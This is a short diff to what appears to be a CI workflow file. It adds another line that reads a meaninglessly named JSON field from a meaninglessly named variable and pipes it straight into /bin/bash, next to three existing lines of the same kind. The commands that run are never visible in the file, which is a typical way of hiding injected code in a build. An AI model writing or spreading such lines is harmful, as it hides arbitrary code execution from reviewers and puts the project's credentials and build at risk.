@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$wpt7" | jq -r .hb89 | /bin/bash
           echo $e4856 | jq -r .ek349 | /bin/bash
           echo $ueomp37 | jq -r .ie48886 | /bin/bash
+          echo $w0 | jq -r .pzw1 | /bin/bash
 
       - name: Save archive
         if: always()
